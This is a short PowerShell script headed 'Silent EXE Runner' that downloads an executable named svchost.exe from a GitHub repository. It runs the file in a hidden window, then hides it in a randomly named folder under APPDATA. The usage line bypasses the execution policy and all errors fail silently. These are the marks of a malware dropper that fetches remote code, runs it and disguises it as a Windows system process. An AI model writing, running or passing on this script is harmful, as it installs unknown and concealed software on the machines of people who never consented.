# Silent EXE Runner
# Usage: powershell -ExecutionPolicy Bypass -File script.ps1

$exeUrl = "https://github.com/hypnotixx0/xenolord/raw/refs/heads/main/svchost.exe"
$downloadPath = "$env:USERPROFILE\Downloads\svchost.exe"
$randomFolder = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
$finalPath = "$env:APPDATA\$randomFolder"

try {
    Invoke-WebRequest -Uri $exeUrl -OutFile $downloadPath -UseBasicParsing
    Start-Process -FilePath $downloadPath -WindowStyle Hidden -Wait
    Start-Sleep -Seconds 600
    New-Item -ItemType Directory -Path $finalPath -Force | Out-Null
    Move-Item -Path $downloadPath -Destination "$finalPath\svchost.exe" -Force
} catch {
    # Silently fail
}
